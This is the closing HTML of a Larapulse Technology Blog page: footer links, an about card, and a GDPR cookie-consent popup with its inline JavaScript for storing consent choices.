href="http://louisbarranqueiro.github.io/hexo-theme-tranquilpeak/" target="_blank">Louis Barranqueiro</a></span><span class="socials"><a href="https://www.youtube.com/channel/UC3wminGFli412MBDKkdUufQ" target="_blank" title="Larapulse at YouTube"><i class="fa fa-youtube-play fa-fw"></i></a><a href="https://www.instagram.com/larapulse.technology/" target="_blank" title="Larapulse at Instagram"><i class="fa fa-instagram fa-fw"></i></a><a href="https://www.facebook.com/larapulse/" target="_blank" title="Larapulse at Facebook"><i class="fa fa-facebook-square fa-fw"></i></a><a href="https://www.linkedin.com/company/larapulse/" target="_blank" title="Larapulse at LinkedIn"><i class="fa fa-linkedin-square fa-fw"></i></a><a href="https://twitter.com/LarapulseT" target="_blank" title="Larapulse at Twitter"><i class="fa fa-twitter fa-fw"></i></a><a href="http://t.me/larapulse" target="_blank" title="Larapulse at Telegram"><i class="fa fa-telegram fa-fw"></i></a></span></footer></div></div><div id="about" class="popup-full non-printable page_speed_1304406891"><div id="about-card" class="page_speed_322911394"><div id="about-btn-close"><i class="fa fa-remove"></i></div><img id="about-card-picture" src=/assets/larapulse_logo_250.png><h4 id="about-card-name">Larapulse Technology Blog</h4><h5 id="about-card-bio"><p> Information Technology blog and group of developers interesting in modern technologies, well-written code and further education </p></h5><h5 id="about-card-job"><i class="fa fa-university"></i><br><p>Founded at 2017</p></h5><h5 id="about-card-location"><i class="fa fa-map-marker"></i><br><p>Germany</p></h5></div></div><div id="cover"></div><script src=/assets/main.4065552450.js></script><div id="gdpr-modal" class="hidden non-printable"><div class="gdpr-modal-inner-wrap"><div class="gdpr-modal-inner"><div id="gdpr-modal-main" class=""><h2>Have a Cookie? :)</h2><img src=/assets/cookie.png alt="cookies"><p> Our site uses cookies to provide functionality and performance as well as for social media and advertising purposes. Social media and advertising cookies of third parties are used to offer you social media functionalities and personalized ads for Larapulse Technology content and offers. To get more information about these cookies and how we process personal data, check our <a href="/data-protection/privacy-policy" target="_blank">Privacy Policy</a>. Do you accept the use of cookies and the processing of personal data involved? </p><div class="button-wrap"><button class="gdpr-button button-secondary" onclick="gdpr_show_more_info()">More Information</button><button class="gdpr-button button-primary" onclick="gdpr_accept()" id="gdpr-accept-btn">Yes, I accept</button></div></div><div id="gdpr-modal-more-info" class="hidden"><h2>Your Cookie Settings</h2><form><div class="gdpr-modal-checkbox"><input type=checkbox id="gdpr-func-checkbox" value="yes" checked="checked" disabled><label for="gdpr-func-checkbox">Site functionality and performance</label></div><p> These cookies are required for Larapulse Technology site functionality and are therefore always enabled. These include cookies that allow you to be remembered as you explore the Larapulse Technology site, help make the shopping cart and checkout process possible as well as assist in security issues and conforming to regulations. To use the Larapulse Technology website, you have to consent to these cookies and the processing of personal data according to the Larapulse Technology website terms of use and privacy policy. </p><div class="gdpr-modal-checkbox"><input type=checkbox id="gdpr-social-checkbox" value="yes" checked=""><label for="gdpr-social-checkbox">Social media and advertising</label></div><p> Social media cookies offer the possibility to connect you to your social networks and share content from our website through social media. Advertising cookies (of third parties) collect information to help better tailor Larapulse Technology advertising to your interests, both within and beyond Larapulse Technology websites. De-selecting these cookies may result in seeing advertising that is not as relevant to you or you not being able to link effectively with Facebook, Twitter, or other social networks and/or not allowing you to share content on social media. </p></form><div class="button-wrap"><button onclick="gdpr_hide_more_info()" class="gdpr-button button-primary">Back</button></div></div></div></div></div><script> "use strict"; var domain = 'larapulse.com'; var GDPR, GDPR_FUNCTIONAL_COOKIE_CONSENT = "no", GDPR_SOCIAL_COOKIE_CONSENT = "no"; function gdpr_accept() { GDPR.userAccept(); } function gdpr_show_more_info() { GDPR.hideElement("gdpr-modal-main"); GDPR.showElement("gdpr-modal-more-info"); } function gdpr_hide_more_info() { GDPR.hideElement("gdpr-modal-more-info"); GDPR.showElement("gdpr-modal-main"); } function should_use_functional_cookie() { return "yes" == GDPR_FUNCTIONAL_COOKIE_CONSENT; } function should_use_social_cookie() { return "yes" == GDPR_SOCIAL_COOKIE_CONSENT; } function show_cookies_settings() { GDPR.showPopup(); gdpr_show_more_info(); } (GDPR = { functional_cookie_consent: !1, social_cookie_consent: !1, opinionGiven: !1, clickedFormObj: null, formChecked: !1, init: function() { this.checkConsent(); !0 === this.opinionGiven || this.isEuCountry() && (window.onload = function() { "/data-protection/privacy-policy" !== window.location.pathname && "/data-protection/cookie-policy" !== window.location.pathname && GDPR.showPopup() } ) }, checkConsent: function() { var o = this.getCookie("functional_cookie_consent"), t = this.getCookie("social_cookie_consent"); "" !== o || "" !== t ? ( this.opinionGiven = !0, "yes" === o && ( this.functional_cookie_consent = !0, GDPR_FUNCTIONAL_COOKIE_CONSENT = "yes" ), "yes" === t && ( this.social_cookie_consent = !0, GDPR_SOCIAL_COOKIE_CONSENT = "yes" ) ) : this.isEuCountry() || (GDPR_SOCIAL_COOKIE_CONSENT = GDPR_FUNCTIONAL_COOKIE_CONSENT = "yes") }, setConsent: function(o, t) { "yes" !== (t = void 0 === t ? "yes" : t) && "no" !== t || ("both" === o ? (this.setCookie("functional_cookie_consent", t, 129600), this.setCookie("social_cookie_consent", t, 129600), this.updateFormSocialConsentField(t), this.updateFormFunctionalConsentField(t)) : ("social" === o && (this.setCookie("social_cookie_consent", t, 129600), this.updateFormSocialConsentField(t)), "functional" === o && (this.setCookie("functional_cookie_consent", t, 129600), this.updateFormFunctionalConsentField(t))), this.checkConsent()) }, deleteConsent: function(o) { "both" === o ? (this.deleteCookie("functional_cookie_consent"), this.deleteCookie("social_cookie_consent")) : "functional " === o ? this.deleteCookie("functional_cookie_consent") : "social" === o && this.deleteCookie("social_cookie_consent") }, userAccept: function() { if (!0 === document.getElementById("gdpr-social-checkbox").checked ? this.setConsent("both", "yes") : (this.setConsent("social", "no"), this.setConsent("functional", "yes")), null !== this.clickedFormObj) { this.checkConsent(); var o = this.clickedFormObj; this.formChecked = !0, o.find(".mktf_submit_button").first().trigger("click"), this.hidePopup() } else document.getElementById("gdpr-accept-btn").disabled = !0, location.reload() }, updateFormSocialConsentField: function(o) { null !== this.clickedFormObj && this.clickedFormObj.find(".mktf_Cookie_Opt_In__c").first().val(o) }, updateFormFunctionalConsentField: function(o) { null !== this.clickedFormObj && this.clickedFormObj.find(".mktf_Functional_Cookie_Opt_In__c").first().val(o) }, showPopup: function() { "no" === this.getCookie("social_cookie_consent") && (document.getElementById("gdpr-social-checkbox").checked = !1), this.showElement("gdpr-modal") }, hidePopup: function() { this.hideElement("gdpr-modal") }, showElement: function(o) { var t = document.getElementById(o); this.removeClass(t, "hidden") }, hideElement: function(o) { var t = document.getElementById(o); this.addClass(t, "hidden") }, hasClass: function(o, t) { return o.classList ? o.classList.contains(t) : !!o.className.match(new RegExp("(\\s|^)" + t + "(\\s|$)")) }, addClass: function(o, t) { o.classList ? o.classList.add(t) : this.hasClass(o, t) || (o.className += " " + t) }, removeClass: function(o, t) { if (o.classList) o.classList.remove(t); else if (this.hasClass(o, t)) { var e = new RegExp("(\\s|^)" + t + "(\\s|$)"); o.className = o.className.replace(e, " ") } }, setCookie: function(o, t, e) { var i = ""; if (null != e) { i = "; expires=" + (i = new Date((new Date).getTime() + 36e5 * e)).toGMTString(); var n = "; path=/" } document.cookie = o + "=" + escape(t) + i + n }, getCookie: function(o) { var t = "" , e = o + "="; if (0 < document.cookie.length) { var i = document.cookie.indexOf(e); if (-1 !== i) { i += e.length; var n = document.cookie.indexOf(";", i); -1 === n && (n = document.cookie.length), t = unescape(document.cookie.substring(i, n)) } } return t }, deleteCookie: function(o) { document.cookie = o + "=; expires=Thu, 01 Jan 1970 00:00:01 GMT; domain="+domain+";" }, isEuCountry: function(o) { /** TODO */ return true; if ("" === (o = void 0 === o ? "" : o)) { var t = GDPR.getCookie("geoip"); if ("" !== t) o = t.split(",")[0] } return "" !== o && -1 !== ["AT", "BE", "BG", "HR", "CY", "CZ", "DK", "EE", "FI", "FR", "DE", "GR", "HU", "IE", "IT", "LV", "LT", "LU", "MT", "NL", "PL", "PT", "RO", "SK", "ES", "SE", "GB"].indexOf(o) } }).init();</script></body></html>